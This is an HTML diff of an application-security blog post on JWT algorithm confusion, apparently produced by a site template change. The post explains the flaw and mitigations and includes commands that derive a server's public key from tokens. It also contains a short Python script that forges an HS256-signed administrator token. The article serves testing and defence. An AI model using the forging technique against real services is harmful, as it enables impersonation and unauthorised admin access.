@@ -1,436 +1,52 @@
-
 <!doctype html>
-<html lang="en" class="no-js">
-  <head>
-    
-      <meta charset="utf-8">
-      <meta name="viewport" content="width=device-width,initial-scale=1">
-      
-      
-      
-        <link rel="canonical" href="https://hansmolemanpng.github.io/blog/jwt-alg-confusion/">
-      
-      
-      
-      
-        
-      
-      
-      <link rel="icon" href="../../assets/profile.jpeg">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.4">
-    
-    
-      
-        <title>JWT Algorithm Confusion Attacks - Hans_Moleman.PNG</title>
-      
-    
-    
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
-      
-        
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
-      
-      
-
-
-    
-    
-      
-    
-    
-      
-        
-        
-        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
-        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
-      
-    
-    
-      <link rel="stylesheet" href="../../assets/extra.css">
-    
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
-    
-      
-
-    
-    
-  </head>
-  
-  
-    
-    
-      
-    
-    
-    
-    
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="orange">
-  
-    
-    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
-    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
-    <label class="md-overlay" for="__drawer"></label>
-    <div data-md-component="skip">
-      
-        
-        <a href="#jwt-algorithm-confusion-attacks" class="md-skip">
-          Skip to content
-        </a>
-      
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>JWT Algorithm Confusion Attacks · Hans_Moleman.PNG</title>
+  <link rel="icon" href="../..assets/profile.jpeg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <link rel="stylesheet" href="../..assets/style.css">
+</head>
+<body>
+  <nav class="topnav">
+    <a class="topnav-logo" href="/">Hans_Moleman.PNG</a>
+    <div class="topnav-links">
+      <a href="/kb/">KB</a>
+      <a href="/blog/">Blog</a>
+      <a href="/about/">About</a>
     </div>
-    <div data-md-component="announce">
-      
-    </div>
+  </nav>
+
+  <main class="main">
     
-    
-    <div class="md-container" data-md-component="container">
-      
-      
-      <main class="md-main" data-md-component="main">
-        <div class="md-main__inner md-grid">
-          
-            
-              
-              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
-                <div class="md-sidebar__scrollwrap">
-                  <div class="md-sidebar__inner">
-                    
+<article class="article">
 
+  <a class="back-link" href="/blog/">← Blog</a>
 
+  <h1 class="article-title">JWT Algorithm Confusion Attacks</h1>
 
-<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
-  <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="Hans_Moleman.PNG" class="md-nav__button md-logo" aria-label="Hans_Moleman.PNG" data-md-component="logo">
-      
-  <img src="../../assets/profile.jpeg" alt="logo">
-
-    </a>
-    Hans_Moleman.PNG
-  </label>
-  
-  <ul class="md-nav__list" data-md-scrollfix>
-    
-      
-      
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Home
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-    
-      
-      
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Blog
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-    
-      
-      
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../kb/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Knowledge Base
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-    
-      
-      
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../about/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    About
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-    
-  </ul>
-</nav>
-                  </div>
-                </div>
-              </div>
-            
-            
-              
-              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
-                <div class="md-sidebar__scrollwrap">
-                  <div class="md-sidebar__inner">
-                    
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#background-rs256-vs-hs256" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Background: RS256 vs HS256
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#the-vulnerability" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        The Vulnerability
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#finding-the-public-key" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Finding the Public Key
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploitation" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Exploitation
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#testing-checklist" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Testing Checklist
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#mitigation" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Mitigation
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#tools" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Tools
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#references" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        References
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-                  </div>
-                </div>
-              </div>
-            
-          
-          
-            <div class="md-content" data-md-component="content">
-              
-              <article class="md-content__inner md-typeset">
-                
-
-
-
-
-
-
-
-
-
-
-
-<div class="layout">
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      
-      <div class="profile">
-        <a class="avatar-link" href="../.." aria-label="Home">
-          <img class="avatar" src="../../assets/profile.jpeg" alt="profile">
-        </a>
-        <div class="name">Hans_Moleman.PNG</div>
-        <div class="bio">AppSec · Web Security · Vulnerability Research</div>
-      </div>
-
-      
-      <div class="social-row">
-        <a class="iconbtn" href="https://x.com/HansMolemanPNG" target="_blank" rel="noopener" aria-label="X">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18.9 2H22l-6.8 7.8L23 22h-6.2l-4.9-6.4L6.3 22H3.2l7.3-8.4L1 2h6.3l4.4 5.8L18.9 2zm-1.1 18h1.7L7.4 3.9H5.6L17.8 20z"/></svg>
-        </a>
-        <a class="iconbtn" href="https://github.com/HansMolemanPNG" target="_blank" rel="noopener" aria-label="GitHub">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0 1 12 6.844a9.59 9.59 0 0 1 2.504.337c1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0 0 22 12.017C22 6.484 17.522 2 12 2z"/></svg>
-        </a>
-        <a class="iconbtn" href="mailto:alsamapa@gmail.com" aria-label="Email">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 4-8 5L4 8V6l8 5 8-5v2z"/></svg>
-        </a>
-      </div>
-
-      <div class="sidebar-divider"></div>
-
-      
-      <div class="navlinks">
-        <div class="navlinks-row">
-          <a class="navbtn" href="../..">Home</a>
-          <a class="navbtn"   href="../../kb/">KB</a>
-          <a class="navbtn active" href="../">Blog</a>
-        </div>
-        <a class="navbtn navbtn--wide" href="../../about/">About</a>
-      </div>
-
-      
-      
-
-    </div>
-  </aside>
-
-  
-  <main class="main main--article">
-
-    
-    
-
-    
-    
-      <a class="back-link" href="../">← Blog</a>
-    
-
-    <div class="article-meta-header"><span class="post-badge post-badge--research">Research</span><span class="article-date">2026-03-06</span></div>
-<h1 id="jwt-algorithm-confusion-attacks">JWT Algorithm Confusion Attacks<a class="headerlink" href="#jwt-algorithm-confusion-attacks" title="Permanent link">&para;</a></h1>
+  <div class="article-content">
+    <div class="post-meta-hdr"><span class="badge badge--research">Research</span><time class="post-date">2026-03-06</time></div>
+<h1 id="jwt-algorithm-confusion-attacks">JWT Algorithm Confusion Attacks</h1>
 <p>Algorithm confusion (also called key confusion) is one of the most dangerous JWT vulnerabilities. When exploitable, it typically gives you the ability to forge arbitrary tokens and impersonate any user, including admins. Despite being well-documented since 2015, it still shows up regularly.</p>
 <hr />
-<h2 id="background-rs256-vs-hs256">Background: RS256 vs HS256<a class="headerlink" href="#background-rs256-vs-hs256" title="Permanent link">&para;</a></h2>
+<h2 id="background-rs256-vs-hs256">Background: RS256 vs HS256</h2>
 <p>JWTs can be signed with different algorithms:</p>
 <ul>
 <li><strong>HS256</strong> — HMAC-SHA256, symmetric. The same secret key is used to sign and verify.</li>
 <li><strong>RS256</strong> — RSA-SHA256, asymmetric. A private key signs; the public key verifies.</li>
 </ul>
 <p>The algorithm is specified in the token header:</p>
-<div class="highlight"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;RS256&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span>
-<span class="p">}</span>
-</code></pre></div>
+<pre class="highlight"><code class="language-json">{
+  "alg": "RS256",
+  "typ": "JWT"
+}</code></pre>
 <hr />
-<h2 id="the-vulnerability">The Vulnerability<a class="headerlink" href="#the-vulnerability" title="Permanent link">&para;</a></h2>
+<h2 id="the-vulnerability">The Vulnerability</h2>
 <p>The attack works when:</p>
 <ol>
 <li>The server signs tokens with <strong>RS256</strong> (private key)</li>
@@ -438,49 +54,44 @@
 <li>The library uses the public key as-is when HS256 is specified</li>
 </ol>
 <p>If an attacker changes <code>alg</code> from <code>RS256</code> to <code>HS256</code>, some libraries will verify the signature using the <strong>public key as the HMAC secret</strong>. Since the public key is, well, public — the attacker can sign arbitrary tokens.</p>
-<div class="highlight"><pre><span></span><code>Server expects RS256:   verify(token, publicKey)
-Attacker sends HS256:   verify(token, publicKey)  ← same call, different interpretation
-</code></pre></div>
+<pre class="highlight"><code>Server expects RS256:   verify(token, publicKey)
+Attacker sends HS256:   verify(token, publicKey)  ← same call, different interpretation</code></pre>
 <p>The root cause is usually a verification function like:</p>
-<div class="highlight"><pre><span></span><code><span class="c1"># Vulnerable</span>
-<span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">public_key</span><span class="p">)</span>  <span class="c1"># trusts the header&#39;s alg field</span>
-</code></pre></div>
-<div class="highlight"><pre><span></span><code><span class="c1"># Safe</span>
-<span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">public_key</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;RS256&quot;</span><span class="p">])</span>  <span class="c1"># explicitly restrict algorithms</span>
-</code></pre></div>
+<pre class="highlight"><code class="language-python"># Vulnerable
+jwt.decode(token, public_key)  # trusts the header's alg field</code></pre>
+<pre class="highlight"><code class="language-python"># Safe
+jwt.decode(token, public_key, algorithms=["RS256"])  # explicitly restrict algorithms</code></pre>
 <hr />
-<h2 id="finding-the-public-key">Finding the Public Key<a class="headerlink" href="#finding-the-public-key" title="Permanent link">&para;</a></h2>
+<h2 id="finding-the-public-key">Finding the Public Key</h2>
 <p>To forge a token you need the server's RSA public key. Common sources:</p>
 <ol>
 <li><strong>JWKS endpoint</strong> — <code>/.well-known/jwks.json</code>, <code>/api/auth/jwks</code></li>
 <li><strong>Embedded in responses</strong> — some apps return it in auth flows</li>
 <li><strong>Derivation from two tokens</strong> — using <code>rsa_sign2n</code> or similar tools, you can derive the public key from two RS256-signed tokens</li>
 </ol>
-<div class="highlight"><pre><span></span><code><span class="c1"># Derive public key from two tokens</span>
-git<span class="w"> </span>clone<span class="w"> </span>https://github.com/silentsignal/rsa_sign2n
-python3<span class="w"> </span>rsa_sign2n/standalone/jwt_forgery.py<span class="w"> </span>token1<span class="w"> </span>token2
-</code></pre></div>
+<pre class="highlight"><code class="language-bash"># Derive public key from two tokens
+git clone https://github.com/silentsignal/rsa_sign2n
+python3 rsa_sign2n/standalone/jwt_forgery.py token1 token2</code></pre>
 <hr />
-<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h2>
+<h2 id="exploitation">Exploitation</h2>
 <p>Once you have the public key, forge a token with an elevated role:</p>
-<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>
+<pre class="highlight"><code class="language-python">import jwt
 
-<span class="n">public_key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;public.pem&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+public_key = open("public.pem").read()
 
-<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="s2">&quot;sub&quot;</span><span class="p">:</span> <span class="s2">&quot;1337&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="s2">&quot;admin&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="s2">&quot;administrator&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;iat&quot;</span><span class="p">:</span> <span class="mi">1700000000</span><span class="p">,</span>
-    <span class="s2">&quot;exp&quot;</span><span class="p">:</span> <span class="mi">9999999999</span>
-<span class="p">}</span>
+payload = {
+    "sub": "1337",
+    "username": "admin",
+    "role": "administrator",
+    "iat": 1700000000,
+    "exp": 9999999999
+}
 
-<span class="n">forged</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">public_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s2">&quot;HS256&quot;</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">forged</span><span class="p">)</span>
-</code></pre></div>
+forged = jwt.encode(payload, public_key, algorithm="HS256")
+print(forged)</code></pre>
 <p>Use the forged token in the <code>Authorization: Bearer</code> header and observe the response.</p>
 <hr />
-<h2 id="testing-checklist">Testing Checklist<a class="headerlink" href="#testing-checklist" title="Permanent link">&para;</a></h2>
+<h2 id="testing-checklist">Testing Checklist</h2>
 <p>When assessing a JWT implementation:</p>
 <ul>
 <li>[ ] Check the <code>alg</code> header — is it RS256/ES256 or symmetric?</li>
@@ -492,12 +103,11 @@ python3<span class="w"> </span>rsa_sign2n/standalone/jwt_forgery.py<span class="
 <li>[ ] Verify the <code>aud</code> (audience) claim is validated</li>
 </ul>
 <hr />
-<h2 id="mitigation">Mitigation<a class="headerlink" href="#mitigation" title="Permanent link">&para;</a></h2>
+<h2 id="mitigation">Mitigation</h2>
 <p><strong>For developers:</strong></p>
 <ul>
 <li>Always explicitly specify allowed algorithms when verifying:
-  <div class="highlight"><pre><span></span><code><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;RS256&quot;</span><span class="p">])</span>
-</code></pre></div></li>
+  <pre class="highlight"><code class="language-python">jwt.decode(token, key, algorithms=["RS256"])</code></pre></li>
 <li>Use a well-maintained JWT library and keep it updated</li>
 <li>Reject tokens with <code>alg: none</code></li>
 <li>Pin the expected algorithm in config, not at runtime</li>
@@ -506,7 +116,7 @@ python3<span class="w"> </span>rsa_sign2n/standalone/jwt_forgery.py<span class="
 - Log JWT verification failures including the algorithm claimed
 - Alert on <code>alg: none</code> or unexpected algorithm changes from the same client</p>
 <hr />
-<h2 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h2>
+<h2 id="tools">Tools</h2>
 <table>
 <thead>
 <tr>
@@ -534,43 +144,30 @@ python3<span class="w"> </span>rsa_sign2n/standalone/jwt_forgery.py<span class="
 </tbody>
 </table>
 <hr />
-<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<h2 id="references">References</h2>
 <ul>
 <li><a href="https://portswigger.net/web-security/jwt">PortSwigger Web Security Academy — JWT attacks</a></li>
 <li><a href="https://www.rfc-editor.org/rfc/rfc7518">RFC 7518 — JSON Web Algorithms</a></li>
 <li><a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">Auth0 — Critical vulnerabilities in JWT libraries (2015)</a></li>
 </ul>
+  </div>
+
+  
+  
+  
+  <div class="article-footer-ref">
+    <span class="footer-ref-label">KB Reference</span>
+    
+    <a href="/kb/cryptography/jwt/">Jwt →</a>
+    
+  </div>
+  
+
+</article>
+
   </main>
 
-</div>
-
-
-
-              </article>
-            </div>
-          
-          
-<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
-        </div>
-        
-      </main>
-      
-    </div>
-    <div class="md-dialog" data-md-component="dialog">
-      <div class="md-dialog__inner md-typeset"></div>
-    </div>
-    
-    
-    
-      
-      
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
-    
-    
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
-      
-        <script src="../../assets/extra.js"></script>
-      
-    
-  </body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script src="../..assets/main.js" defer></script>
+</body>
 </html>
